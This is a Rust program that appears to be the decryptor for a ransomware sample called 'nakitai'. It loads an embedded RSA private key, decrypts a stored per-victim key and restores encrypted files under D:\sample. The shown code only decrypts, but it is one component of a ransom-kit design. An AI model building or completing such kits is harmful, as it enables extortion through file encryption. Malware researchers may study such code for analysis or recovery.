mod utils;

use base64::decode;
use openssl::rsa::Rsa;
use std::{fs::File, io::Read};
use utils::{crypto, traverse};

fn main() -> Result<(), anyhow::Error> {
    let og_private_key_b = include_bytes!("../private.pem");
    let og_private_key = Rsa::private_key_from_pem(&og_private_key_b.as_slice())?;

    let mut encrypted_nakitai_key_encoded_buffer = Vec::new();
    let mut encoded_nakitai_key_file = File::open("D:\\sample\\decrypt_key.nky")?;

    encoded_nakitai_key_file.read_to_end(&mut encrypted_nakitai_key_encoded_buffer)?;

    let encrypted_nakitai_key = decode(&encrypted_nakitai_key_encoded_buffer)?;

    let private_key = crypto::decrypt_private_key(256, &og_private_key, &encrypted_nakitai_key)?;

    traverse::find_encrypted_files("D:\\sample", |entry, _| {
        let file_path = entry.path().display().to_string();
        match crypto::decrypt_file(&file_path, 256, &private_key) {
            Ok(_) => {}
            Err(err) => {
                println!("err!!! => [{:?}] {:?}", file_path, err)
            }
        }
    });

    Ok(())
}
